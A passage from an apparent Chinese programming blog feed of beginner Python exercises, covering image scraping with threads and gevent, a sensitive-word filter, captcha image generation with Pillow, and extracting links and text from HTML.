l.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        i.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#阻塞线程等待结束</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    img_dir = <span class="string">'img'</span></span><br><span class="line">    url = <span class="string">"http://tieba.baidu.com/p/2166231880"</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取所有图片地址</span></span><br><span class="line">    img_urls = re.findall(<span class="string">r'img pic_type="0" class="BDE_Image" src="(.*?)"'</span>,html.text)</span><br><span class="line">    </span><br><span class="line">    thread_get(img_urls,img_dir)</span><br></pre></td></tr></table></figure></li><li><p><a href="http://www.gevent.org/contents.html" target="_blank" rel="noopener">gevent协程</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> pool,monkey</span><br><span class="line"></span><br><span class="line"><span class="comment">#打补丁，使阻塞IO变成非阻塞</span></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(url,filename)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#content的内容即为图片的二进制</span></span><br><span class="line">        img = requests.get(url,timeout=<span class="number">3</span>).content       </span><br><span class="line">        print(<span class="string">'downing ..... &#123;&#125;'</span>.format(filename) )</span><br><span class="line"></span><br><span class="line">        <span class="comment">#保存图片</span></span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(img)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gevent_get</span><span class="params">(urls,img_dir)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(img_dir):os.mkdir(img_dir)</span><br><span class="line"></span><br><span class="line">    jobs = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        imgname = url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">        filename = os.path.join(img_dir,imgname)</span><br><span class="line">        <span class="comment">#绑定协程对象</span></span><br><span class="line">        jobs.append(gevent.spawn(save_img,url,filename))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#启动</span></span><br><span class="line">    gevent.joinall(jobs)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#阻塞</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> jobs:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    img_dir = <span class="string">'img'</span></span><br><span class="line">    url = <span class="string">"http://tieba.baidu.com/p/2166231880"</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取所有图片地址</span></span><br><span class="line">    img_urls = re.findall(<span class="string">r'img pic_type="0" class="BDE_Image" src="(.*?)"'</span>,html.text)</span><br><span class="line">    </span><br><span class="line">    gevent_get(img_urls,img_dir)</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://thief.one/2017/02/17/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%B8%A1%E5%B9%B4%E4%B8%8D%E9%B8%A1%E8%82%8B/" target="_blank" rel="noopener">https://thief.one/2017/02/17/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%B8%A1%E5%B9%B4%E4%B8%8D%E9%B8%A1%E8%82%8B/</a></li><li><a href="https://thief.one/2017/02/20/Python%E5%8D%8F%E7%A8%8B/" target="_blank" rel="noopener">https://thief.one/2017/02/20/Python%E5%8D%8F%E7%A8%8B/</a></li><li><a href="https://eastlakeside.gitbooks.io/interpy-zh/content/Coroutines/" target="_blank" rel="noopener">https://eastlakeside.gitbooks.io/interpy-zh/content/Coroutines/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;用 Python 写一个爬图片的程序，爬 这个链接里的日本妹子图片 :-)
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0012</title>
    <link href="https://xiaotaoist.github.io/2018/06/05/python-exercise-0012/"/>
    <id>https://xiaotaoist.github.io/2018/06/05/python-exercise-0012/</id>
    <published>2018-06-05T02:18:13.000Z</published>
    <updated>2018-06-05T03:13:43.365Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>敏感词文本文件 filtered_words.txt，里面的内容 和 0011题一样，当用户输入敏感词语，则用 星号 * 替换，例如当用户输入「北京是个好城市」，则变成「**是个好城市」。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>思路和<a href="https://xiaotaoist.github.io/2018/06/04/python-exercise-0011/">0011题</a>一样，接着使用<a href="http://www.runoob.com/python/att-string-replace.html" target="_blank" rel="noopener">str.replace</a>方法,将敏感词替换为*。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li><p>普通版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'filtered_words.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment">#读取内容到一个列表，并过滤每项中的'\n'</span></span><br><span class="line">        text = <span class="string">''</span>.join(f.readlines()).strip(<span class="string">'\n'</span>).split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment">#读取输入</span></span><br><span class="line">        line = input(<span class="string">"&gt; "</span>)</span><br><span class="line">        <span class="comment">#循环替换一遍</span></span><br><span class="line">        <span class="keyword">for</span> words <span class="keyword">in</span> text:</span><br><span class="line">                <span class="comment">#根据敏感词长度打印*的长度</span></span><br><span class="line">                line = line.replace(words,len(words)*‘*’) </span><br><span class="line"></span><br><span class="line">        print(line)</span><br></pre></td></tr></table></figure></li><li><p>高效版，从<a href="https://github.com/dantezhu/wfgfw" target="_blank" rel="noopener">Github</a>上找一个DFA，BF算法实现的匹配过滤，由于python2写的，我们可以简单修改一下，去除编码部分的判断即可在Python3下正常使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wfgfw <span class="keyword">import</span> DFAFilter</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造DFAFilter对象</span></span><br><span class="line">f = DFAFilter()</span><br><span class="line"><span class="comment">#添加关键词</span></span><br><span class="line">f.parse(<span class="string">'filtered_words.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        msg = input(<span class="string">"&gt;"</span>)</span><br><span class="line">        <span class="comment">#过滤消息，默认返回(布尔值，过滤过的内容)</span></span><br><span class="line">        _,out = f.filter(msg)</span><br><span class="line">        print(out)</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/dantezhu/wfgfw/blob/master/wfgfw/wfgfw.py" target="_blank" rel="noopener">https://github.com/dantezhu/wfgfw/blob/master/wfgfw/wfgfw.py</a></li><li><a href="https://xiaotaoist.github.io/2018/06/04/python-exercise-0011">https://xiaotaoist.github.io/2018/06/04/python-exercise-0011</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;敏感词文本文件 filtered_words.txt，里面的内容 和 0011题一样，当用户输入敏感词语，则用 星号 * 替换，例如当用户输入「北京是个好城市」，则变成「**是个好城市」。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0011</title>
    <link href="https://xiaotaoist.github.io/2018/06/04/python-exercise-0011/"/>
    <id>https://xiaotaoist.github.io/2018/06/04/python-exercise-0011/</id>
    <published>2018-06-04T05:04:13.000Z</published>
    <updated>2018-06-04T06:38:57.697Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>敏感词文本文件 filtered_words.txt，里面的内容为以下内容，当用户输入敏感词语时，则打印出 Freedom，否则打印出 Human Rights。</code></pre><a id="more"></a><blockquote><p>北京<br>程序员<br>公务员<br>领导<br>牛比<br>牛逼<br>你娘<br>你妈<br>love<br>sex<br>jiangge</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>读取文本内容，添加到列表，获取输入，匹配即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'filtered_words.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment">#读取内容到一个列表，并过滤每项中的'\n'</span></span><br><span class="line">        text = <span class="string">''</span>.join(f.readlines()).strip(<span class="string">'\n'</span>).split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment">#读取输入</span></span><br><span class="line">        line = input(<span class="string">"&gt; "</span>)</span><br><span class="line">        <span class="comment">#判断输入内容是否含有敏感词</span></span><br><span class="line">        <span class="keyword">if</span> any( [words <span class="keyword">in</span> line <span class="keyword">for</span> words <span class="keyword">in</span> text]):</span><br><span class="line">                print(<span class="string">'Freedom'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'Human Rights'</span>)</span><br></pre></td></tr></table></figure><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>当敏感词列表非常多的时候这示例就不是那么好用了，主要原因在于字符匹配算法太低效，可以尝试：</p><ul><li>AC自动机： <a href="https://github.com/gongchangpy/ahocorasick-python" target="_blank" rel="noopener">https://github.com/gongchangpy/ahocorasick-python</a></li><li>DFA算法：<a href="https://github.com/iistrate/DFA" target="_blank" rel="noopener">https://github.com/iistrate/DFA</a></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.topjishu.com/1826.html" target="_blank" rel="noopener">https://www.topjishu.com/1826.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;敏感词文本文件 filtered_words.txt，里面的内容为以下内容，当用户输入敏感词语时，则打印出 Freedom，否则打印出 Human Rights。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0010</title>
    <link href="https://xiaotaoist.github.io/2018/06/03/python-exercise-0010/"/>
    <id>https://xiaotaoist.github.io/2018/06/03/python-exercise-0010/</id>
    <published>2018-06-03T02:57:13.000Z</published>
    <updated>2018-06-07T04:00:44.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>使用 Python 生成类似于下图中的字母验证码图片。</code></pre><a id="more"></a><p><img src="https://camo.githubusercontent.com/f80e7aa0d43b3685657b4d329f2809a28c82e12a/687474703a2f2f692e696d6775722e636f6d2f615668626567562e6a7067" alt="img"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="http://stackoverflow.com/questions/2823316/generate-a-random-letter-in-python" target="_blank" rel="noopener">阅读资料</a>内容是如何生成随机字母，还需要使用<a href="https://pillow-zh-cn.readthedocs.io/zh_CN/latest/handbook/index.html" target="_blank" rel="noopener">pillow</a>库建立画布，填充背景颜色和字母，模糊处理，显示结果，这里主要参考廖雪峰Python 教程中的<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014320027235877860c87af5544f25a8deeb55141d60c5000" target="_blank" rel="noopener">Pillow</a>部分的示例。</p><blockquote><p>pip install pillow</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">使用 Python 生成类似于下图中的字母验证码图片。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageFilter</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机字母:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rndChar</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> random.choice(string.ascii_letters)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机背景色:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bkgColor</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (random.randint(<span class="number">64</span>, <span class="number">255</span>), random.randint(<span class="number">64</span>, <span class="number">255</span>), random.randint(<span class="number">64</span>, <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机字母色:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charColor</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (random.randint(<span class="number">32</span>, <span class="number">127</span>), random.randint(<span class="number">32</span>, <span class="number">127</span>), random.randint(<span class="number">32</span>, <span class="number">127</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容纳4个字符的宽度 240:</span></span><br><span class="line">width = <span class="number">60</span> * <span class="number">4</span></span><br><span class="line">height = <span class="number">60</span></span><br><span class="line">image = Image.new(<span class="string">'RGB'</span>, (width, height), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"><span class="comment"># 创建Font对象:</span></span><br><span class="line">font = ImageFont.truetype(<span class="string">'consolab.ttf'</span>, <span class="number">42</span>)</span><br><span class="line"><span class="comment"># 创建Draw对象:</span></span><br><span class="line">draw = ImageDraw.Draw(image)</span><br><span class="line"><span class="comment"># 填充每个像素:</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">        draw.point((x, y), fill=bkgColor())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出文字:</span></span><br><span class="line">letters = []</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        char = rndChar()</span><br><span class="line">        letters.append(char)</span><br><span class="line">        <span class="comment">#随机偏移位置</span></span><br><span class="line">        draw.text((<span class="number">60</span> * t + random.randint(<span class="number">10</span>,<span class="number">20</span>), random.randint(<span class="number">10</span>,<span class="number">20</span>)),char, font=font, fill=charColor())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模糊:</span></span><br><span class="line">image = image.filter(ImageFilter.BLUR)</span><br><span class="line">image.save(<span class="string">'code.png'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示</span></span><br><span class="line">print(letters)</span><br><span class="line">image.show()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/</a></li><li><a href="https://stackoverflow.com/questions/2823316/generate-a-random-letter-in-python" target="_blank" rel="noopener">https://stackoverflow.com/questions/2823316/generate-a-random-letter-in-python</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;使用 Python 生成类似于下图中的字母验证码图片。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0009</title>
    <link href="https://xiaotaoist.github.io/2018/06/02/python-exercise-0009/"/>
    <id>https://xiaotaoist.github.io/2018/06/02/python-exercise-0009/</id>
    <published>2018-06-02T11:36:23.000Z</published>
    <updated>2018-06-02T13:13:22.916Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>一个HTML文件，找出里面的链接。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先用<a href="https://docs.python.org/3/library/urllib.request.html" target="_blank" rel="noopener">urlib</a>获取html内容，接着用<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" target="_blank" rel="noopener">BeautifulSoup</a>库去解析<a href="http://www.w3school.com.cn/html/html_jianjie.asp" target="_blank" rel="noopener">HTML</a>的a标签,官方文档中就有这个获取链接的示例。</p><blockquote><p>pip install beautifulsoup4 lxml</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li><p>使用BeautifulSoup库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">一个HTML文件，找出里面的链接。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> BS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432688314740a0aed473a39f47b09c8c7274c9ab6aee000"</span></span><br><span class="line"></span><br><span class="line">req = request.Request(url)</span><br><span class="line">req.add_header(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'</span>)</span><br><span class="line"><span class="comment">#读取网页内容以utf-8解码</span></span><br><span class="line">html = request.urlopen(req).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">soup = BS(html,<span class="string">'lxml'</span>)</span><br><span class="line"><span class="comment">#查找所有&lt;a&gt;</span></span><br><span class="line">a = soup.find_all(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#找href属性的内容</span></span><br><span class="line">    href = link.get(<span class="string">'href'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#排除一些#或./之类的干扰链接</span></span><br><span class="line">        <span class="keyword">if</span>  href.startswith(<span class="string">'http'</span>):</span><br><span class="line">            print(href)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p>使用正则表达式<br>有一些链接是不在a标签里的，可以简单粗暴的匹配所有href里的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432688314740a0aed473a39f47b09c8c7274c9ab6aee000"</span></span><br><span class="line"></span><br><span class="line">req = request.Request(url)</span><br><span class="line">req.add_header(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'</span>)</span><br><span class="line"><span class="comment">#读取网页内容以utf-8解码</span></span><br><span class="line">html = request.urlopen(req).read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">href = re.findall(<span class="string">r'href="(http.*?)"'</span>,html)</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> href:</span><br><span class="line">        print(link)</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/</a></li><li><a href="https://stackoverflow.com/questions/6883049/regex-to-find-urls-in-string-in-python" target="_blank" rel="noopener">https://stackoverflow.com/questions/6883049/regex-to-find-urls-in-string-in-python</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;一个HTML文件，找出里面的链接。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0008</title>
    <link href="https://xiaotaoist.github.io/2018/06/01/python-exercise-0008/"/>
    <id>https://xiaotaoist.github.io/2018/06/01/python-exercise-0008/</id>
    <published>2018-05-31T23:32:30.000Z</published>
    <updated>2018-06-01T01:05:26.327Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>一个HTML文件，找出里面的正文。</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们可以用<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" target="_blank" rel="noopener">BeautifulSoup</a>库去解析<a href="http://www.w3school.com.cn/html/html_jianjie.asp" target="_blank" rel="noopener">HTML</a>，的结构获取内容,手册提供的实例中就有这个内容，只需要使用<code>get_text()</code>函数即可获取里面的文字内容。</p><blockquote><p>pip install beautifulsoup4 lxml</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">一个HTML文件，找出里面的正文。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> BS</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造一个BeautifulSoup对象</span></span><br><span class="line">soup = BS(open(<span class="string">'show-me-the-code.html'</span>),<span class="string">'lxml'</span>)</span><br><span class="line"><span class="comment">#获取正文</span></span><br><span class="line">print(soup.get_text())</span><br></pre></td></tr></table></figure><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>实际上这只是简单的获取标签内容，真正使用的时候，遇到复杂的网页,效果就不是很好了。这时需要一些算法来优化结果。</p><ul><li>基于行块分布函数的cx-extractor：<a href="https://github.com/chrislinan/cx-extractor-python" target="_blank" 